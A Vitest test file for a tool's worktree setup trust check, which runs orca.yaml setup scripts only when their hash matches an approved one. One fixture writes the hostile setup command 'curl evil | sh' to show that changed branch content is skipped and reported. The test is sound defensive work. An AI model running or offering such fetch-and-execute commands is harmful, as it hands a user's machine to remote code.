import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createHash } from 'node:crypto'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Repo } from '../../../../shared/repo-types'
import { getDefaultSettings } from '../../../../shared/constants'
import { prepareRuntimeLocalWorktreeSetup } from './runtime-local-worktree-setup'

const runner = vi.hoisted(() => ({ createSetupRunnerScript: vi.fn() }))
vi.mock('../../../workspace-hooks/worktree-runner-script', () => ({
  createSetupRunnerScript: runner.createSetupRunnerScript,
  resolveSetupRunnerShell: () => undefined
}))

const PRIMARY_YAML = 'scripts:\n  setup: pnpm install\n'
const PRIMARY_TRUST_CONTENT = 'pnpm install'
const sha256 = (text: string): string => createHash('sha256').update(text).digest('hex')

let worktreePath: string
const repo: Repo = { id: 'repo', path: '/primary', displayName: 'r', badgeColor: '', addedAt: 0 }

function prepare(approvedSetupHash?: string, approvedSetupHashes?: string[]) {
  return prepareRuntimeLocalWorktreeSetup({
    request: {
      repoSelector: 'id:repo',
      name: 'w',
      setupDecision: 'run',
      ...(approvedSetupHash !== undefined ? { approvedSetupHash } : {}),
      ...(approvedSetupHashes ? { approvedSetupHashes } : {})
    },
    repo,
    worktreePath,
    settings: getDefaultSettings(tmpdir()),
    runtimeTarget: undefined,
    shouldUseSetupRunner: true
  })
}

beforeEach(() => {
  worktreePath = mkdtempSync(join(tmpdir(), 'orca-setup-trust-'))
  runner.createSetupRunnerScript.mockReset().mockResolvedValue({
    runnerScriptPath: join(worktreePath, 'runner.sh'),
    envVars: {}
  })
})

afterEach(() => {
  rmSync(worktreePath, { recursive: true, force: true })
})

describe('created worktree setup trust', () => {
  it('runs setup when the created branch matches the approved content', async () => {
    writeFileSync(join(worktreePath, 'orca.yaml'), PRIMARY_YAML)
    const result = await prepare(sha256(PRIMARY_TRUST_CONTENT))
    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
    expect(result.setup).toBeDefined()
    expect(result.setupTrustMismatch).toBeUndefined()
  })

  it('skips setup and default tab commands and reports the branch content when it differs', async () => {
    writeFileSync(
      join(worktreePath, 'orca.yaml'),
      'scripts:\n  setup: curl evil | sh\ndefaultTabs:\n  - title: dev\n    command: pnpm dev\n  - title: notes\n'
    )
    const result = await prepare(sha256(PRIMARY_TRUST_CONTENT))
    expect(runner.createSetupRunnerScript).not.toHaveBeenCalled()
    expect(result.setup).toBeUndefined()
    // Only the command-less tab opens now; approving adds the command tab.
    expect(result.defaultTabs).toEqual({ tabs: [{ title: 'notes' }], runCommands: false })
    expect(result.shouldRunSetup).toBe(false)
    expect(result.warning).toBeUndefined()
    const scriptContent = 'curl evil | sh\n\n# defaultTabs[1] dev\npnpm dev'
    expect(result.setupTrustMismatch).toEqual({ contentHash: sha256(scriptContent), scriptContent })
  })

  it("runs setup when the branch's content matches an earlier approval for the repo", async () => {
    writeFileSync(
      join(worktreePath, 'orca.yaml'),
      'scripts:\n  setup: pnpm install --frozen-lockfile\n'
    )
    const result = await prepare(sha256(PRIMARY_TRUST_CONTENT), [
      sha256('pnpm install --frozen-lockfile')
    ])
    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
    expect(result.setupTrustMismatch).toBeUndefined()
  })

  it('skips setup a branch adds when the primary checkout had none', async () => {
    writeFileSync(join(worktreePath, 'orca.yaml'), PRIMARY_YAML)
    const result = await prepare(sha256(''))
    expect(runner.createSetupRunnerScript).not.toHaveBeenCalled()
    expect(result.setupTrustMismatch?.scriptContent).toBe(PRIMARY_TRUST_CONTENT)
  })

  it('runs the created branch setup as before when an older client sends no approval', async () => {
    writeFileSync(join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: make bootstrap\n')
    const result = await prepare()
    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
    expect(result.setupTrustMismatch).toBeUndefined()
  })
})
